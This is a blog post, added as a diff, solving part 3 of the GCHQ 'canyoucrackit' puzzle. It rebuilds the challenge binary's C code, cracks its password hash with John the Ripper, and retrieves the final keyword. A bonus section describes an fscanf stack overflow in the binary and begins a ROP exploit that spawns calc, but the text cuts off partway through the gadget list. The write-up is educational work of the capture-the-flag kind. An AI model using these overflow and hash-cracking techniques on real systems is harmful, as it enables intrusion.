@@ -1,0 +1,1018 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>GCHQ Challenge Part 3 : www.canyoucrackit.co.uk</title>
+  <meta name="description" content="As I have seen that many people already posted their solutions … I do not see the point of keeping mine :). Here it is.">
+
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="canonical" href="/binholic/2011/12/03/gchq-challenge-part-3.html">
+  <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
+
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9302170278788846",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-16686496-2');
+</script>
+
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Binary World for Binary People :)</a>
+
+    <!--
+    <h2 class="site-subtitle">
+        <span class="site-subtitle-quote">"empty
+"</span>
+        <span class="site-subtitle-author">- no_author -</span>
+    </h2>
+    -->
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <a class="page-link" href="/blog/">Blog</a>
+      </div>
+      
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">GCHQ Challenge Part 3 : www.canyoucrackit.co.uk</h1>
+    <p class="post-meta"><time datetime="2011-12-03T19:49:00+01:00" itemprop="datePublished">Dec 3, 2011</time> • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">m_101</span></span></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p><b style="color: red;">As I have seen that many people already posted their solutions … I do not see the point of keeping mine :). Here it is.</b></p>
+
+<p>Hello,</p>
+
+<p>Here is the final part of the GCHQ recruitment compaign.</p>
+
+<h1 id="the-challenge">The challenge</h1>
+
+<p>We are offered an executable file (compiled under cygwin …) to analyze.</p>
+
+<h1 id="the-analysis">The “analysis”</h1>
+
+<p>The analysis was pretty straightforward.
+No protections (you can look with PEiD, etc).</p>
+
+<p>Open it in ImmunityDBG or IDAPro or whatsoever and reverse the code.
+I won’t do a detailed analysis of the ASM code.</p>
+
+<p>I basically reconstructed the C code (easier to explain no? :)):</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+</pre></td><td class="code"><pre><span class="cp">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="cp">#include &lt;sys/socket.h&gt;
+#include &lt;netdb.h&gt;
+</span>
+<span class="cp">#include &lt;crypt.h&gt;
+</span>
+<span class="cp">#define SERVER_PORT 80
+</span>
+<span class="k">static</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">crypted_password</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"hqDTK7b8K2rvw"</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">server_connect</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">hostname</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">keys</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">retcode</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="c1">// socket stuffs</span>
+    <span class="kt">int</span> <span class="n">sockfd</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">hostent</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">addr</span><span class="p">;</span>
+    <span class="c1">// recv stuffs</span>
+    <span class="kt">int</span> <span class="n">recvBytes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">host</span> <span class="o">=</span> <span class="n">gethostbyname</span><span class="p">(</span><span class="n">hostname</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">host</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"error: gethostbyname() failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// set up sockaddr</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">),</span> <span class="n">host</span><span class="o">-&gt;</span><span class="n">h_addr_list</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">host</span><span class="o">-&gt;</span><span class="n">h_length</span><span class="p">);</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">SERVER_PORT</span><span class="p">);</span>
+
+    <span class="c1">// open socket</span>
+    <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
+
+    <span class="c1">// connect to target</span>
+    <span class="n">retcode</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">retcode</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"error: connect(</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">) failed</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">hostname</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// construct GET request</span>
+    <span class="n">sprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"GET /%s/%x/%x/%x/key.txt HTTP/1.0</span><span class="se">\r\n\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">crypted_password</span><span class="p">,</span> <span class="n">keys</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">keys</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">keys</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"request:</span><span class="se">\n\n</span><span class="s">%s"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+
+    <span class="c1">// send request</span>
+    <span class="n">retcode</span> <span class="o">=</span> <span class="n">send</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">retcode</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"error: send() failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// get response</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"response:</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="k">do</span> <span class="p">{</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+        <span class="n">recvBytes</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">recvBytes</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">recvBytes</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">recvBytes</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">buffer</span><span class="p">;</span>
+    <span class="c1">// license stuffs</span>
+    <span class="kt">int</span> <span class="n">hasLicense</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">crypted</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">keys</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+    <span class="n">hasLicense</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">keygen.exe</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="c1">// check args</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"usage: keygen.exe hostname</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// open license file</span>
+    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"license.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"error: license.txt not found</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">);</span>
+    <span class="n">fscanf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+    <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+
+    <span class="c1">// if buffer does not begin with gchq</span>
+    <span class="c1">// then bye</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr</span> <span class="o">!=</span> <span class="mh">0x71686367</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"error: license.txt invalid</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// check for password</span>
+    <span class="n">crypted</span> <span class="o">=</span> <span class="n">crypt</span><span class="p">(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">crypted_password</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">crypted</span><span class="p">,</span> <span class="n">crypted_password</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="n">hasLicense</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"loading stage1 license key(s)...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">keys</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mi">12</span><span class="p">));</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"loading stage2 license key(s)...</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">keys</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mi">16</span><span class="p">));</span>
+    <span class="n">keys</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mi">20</span><span class="p">));</span>
+    <span class="c1">// if we don't have license</span>
+    <span class="c1">// then bye</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hasLicense</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"error: license.txt invalid</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">server_connect</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">keys</span><span class="p">);</span>
+<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>So basically, it search for a license.txt file with a specific file format which is as follow:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+</pre></td><td class="code"><pre>gchq | password | dword 0 | dword 1 | dword 2</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>In the ASM code you have this:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="code"><pre>.text:00401120 loc_401120:                             ; CODE XREF: main+76 j
+.text:00401120                 mov     [esp+78h+var_70], 18h
+.text:00401128                 mov     [esp+78h+var_74], 0
+.text:00401130                 lea     eax, [ebp+buffer]
+.text:00401133                 mov     [esp+78h+var_78], eax
+.text:00401136                 call    memset</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>We have the value 0x18 which is 24 in decimal ;).
+It basically mean that you have a 24 bytes buffer which receive “gchq”, the password and 3 dwords. From this we can deduce the password size: 24 - 4 - 12 = 8.</p>
+
+<p>From there, we can set a jtr rule in the /etc/john/john.conf file:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="code"><pre># custom incremental mode
+[Incremental:cyber]
+File = $JOHN/alpha.chr
+MinLen = 8
+MaxLen = 8
+CharCount = 26</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>We suppose the password is full alpha.</p>
+
+<p>Then we have to format our hash using the standard unix format:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+</pre></td><td class="code"><pre>cyber:hqDTK7b8K2rvw:1:2:3:4:::</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>We bruteforce it like this:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+</pre></td><td class="code"><pre><span class="nv">$ </span>john <span class="nt">-i</span>:cyber <span class="nb">hash</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>If you’ve got rainbow tables or the word in your wordlist then you are lucky not to bruteforce like i had to.</p>
+
+<p>It took me around 35 minutes to get the password:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="code"><pre><span class="nv">$ </span>john <span class="nt">-show</span> ./hash 
+cyber:cyberwin:1:2:3:4:::
+
+1 password <span class="nb">hash </span>cracked, 0 left</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>About the dwords … where do we get them?</p>
+
+<p>They give us tips:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="code"><pre>loading stage1 license key(s)...
+loading stage2 license key(s)...</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>So the dwords are in the first and second challenges.
+Remember that there are some dwords that we don’t use.</p>
+
+<p>In the first challenge:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="code"><pre><span class="n">main</span><span class="o">:</span>
+    <span class="k">jmp</span> <span class="n">short</span> <span class="n">begin</span>
+
+<span class="n">key0</span><span class="o">:</span> <span class="kt">dd</span> <span class="mh">0xa3bfc2af</span>
+
+<span class="c">; let's make some space for our buffer!</span>
+<span class="n">begin</span><span class="o">:</span>
+    <span class="k">sub</span> <span class="n">esp</span><span class="p">,</span> <span class="mh">0x100</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>In the second challenge:</p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+</pre></td><td class="code"><pre><span class="nx">firmware</span><span class="p">:</span> <span class="p">[</span><span class="mh">0xd2ab1f05</span><span class="p">,</span> <span class="mh">0xda13f110</span><span class="p">]</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>Now ce can construct the license file using the following (don’t forget about little endian here if you are on x86 ;)):</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+</pre></td><td class="code"><pre><span class="nv">$ </span><span class="nb">printf</span> <span class="s2">"gchqcyberwin</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">a3</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">ab</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">f1</span><span class="se">\x</span><span class="s2">13</span><span class="se">\x</span><span class="s2">da"</span> <span class="o">&gt;</span> license.txt</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>You can either compile the reversed version or use the given executable:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+</pre></td><td class="code"><pre><span class="nv">$ </span>gcc <span class="nt">-o</span> reversed reversed.c <span class="nt">-lcrypt</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>You will get this output:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td><td class="code"><pre><span class="nv">$ </span>./reversed www.canyoucrackit.co.uk
+
+keygen.exe
+
+loading stage1 license key<span class="o">(</span>s<span class="o">)</span>...
+loading stage2 license key<span class="o">(</span>s<span class="o">)</span>...
+
+request:
+
+GET /hqDTK7b8K2rvw/a3bfc2af/d2ab1f05/da13f110/key.txt HTTP/1.0
+
+response:
+
+HTTP/1.1 404 Not Found
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
+Server: Microsoft-HTTPAPI/2.0
+Date: Mon, 05 Dec 2011 03:55:34 GMT
+Connection: close
+Content-Length: 315
+
+&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd"</span><span class="o">&gt;</span>
+&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Not Found
+&lt;META HTTP-EQUIV<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">Content</span><span class="o">=</span><span class="s2">"text/html; charset=us-ascii"</span><span class="o">&gt;</span>
+&lt;BODY&gt;&lt;h2&gt;Not Found&lt;/h2&gt;
+&lt;hr&gt;&lt;p&gt;HTTP Error 404. The requested resource is not found.
+&lt;/BODY&gt;&lt;/HTML&gt;</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>If you look in your browser at the following address:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+</pre></td><td class="code"><pre>http://www.canyoucrackit.co.uk/hqDTK7b8K2rvw/a3bfc2af/d2ab1f05/da13f110/key.txt</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>You will get the keyword:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+</pre></td><td class="code"><pre>Pr0t3ct!on#cyber_security@12*12.2011+</pre></td></tr></tbody></table></code></pre></figure>
+
+<h1 id="congratz">Congratz</h1>
+
+<p>Done, you have a congratulation message (<a href="http://www.canyoucrackit.co.uk/soyoudidit.asp">here</a>):</p>
+
+<p><img src="/assets/img/gchq_canyoucrackit_part3_congratulation.png" alt="GCHQ Part 3 - Congratulation" /></p>
+
+<p>If you click on the button:</p>
+
+<p><img src="/assets/img/gchq_canyoucrackit_part3_apply.png" alt="GCHQ Part 3 - Apply" /></p>
+
+<p>You have the following links:</p>
+
+<ul>
+  <li><a href="https://apply.gchq-careers.co.uk/fe/tpl_gchq01ssl.asp?newms=jj&amp;id=35874">Apply</a></li>
+  <li><a href="/assets/others/docs/cyber-security-specialists.pdf">View case study 1</a></li>
+  <li><a href="/assets/others/docs/102491_GCHQ_cyber_cs.pdf">View case study 2</a></li>
+  <li><a href="http://www.gchq-careers.co.uk/Jobs/">GCHQ Headquarters</a></li>
+</ul>
+
+<p>If you click on the Apply button:</p>
+
+<p><img src="/assets/img/gchq_canyoucrackit_part3_job.png" alt="GCHQ Part 3 - Job Description" /></p>
+
+<p>And they wonder why they are lacking resources in reversers, hackers and alike … a pay between 25, 446 and 31, 152 pounds …
+Poor pay for rare skills and working for a government agency … not including the lies you are required to give out to your friends and so on.</p>
+
+<h1 id="bonus-track">Bonus Track</h1>
+
+<p>Oh yes, surprise, surprise, this challenge is vulnerable :).</p>
+
+<p>If you reverse and read the code with care … you’d see that the fscanf() function is susceptible to an overflow ;).</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+</pre></td><td class="code"><pre><span class="n">fscanf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>If you read the manual:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="code"><pre>s      Matches a sequence of non-white-space characters; the next pointer must be a pointer to character array that is long enough
+              to hold the input sequence and the terminating null character ('\0'), which is added automatically.  The input string stops
+              at white space or at the maximum field width, whichever occurs first.</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>Yep, it doesn’t end at ‘\0’ ;).
+It basically end reading when you end the file or the size specification or whitespaces: “\x20\x09\x0d\x0c\x0b\x0a”.</p>
+
+<p>So I coded an exploit spawning a calc.
+There is a limit as of the size of the payload, around 700-800 bytes which cause cygwin to have a deadlock in the fclose() call. I did not investigate further as how to bypass this restriction.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+</pre></td><td class="code"><pre><span class="c1">#!/usr/bin/python3
+</span>
+<span class="s">''' Gadgets '''</span>
+
+<span class="c1"># gadget(s) from cygwin-1.dll
+</span>
+<span class="c1"># == stack related
+# pushad | retn
+</span><span class="n">pushad</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xbc\xce\x02\x61</span><span class="s">'</span>
+<span class="c1"># pop eax | retn
+</span><span class="n">pop_eax</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x94\xa4\x14\x61</span><span class="s">'</span>
+<span class="c1"># pop ebx | retn
+</span><span class="n">pop_ebx</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xe9\x0e\x03\x61</span><span class="s">'</span>
+<span class="c1"># pop edi | retn
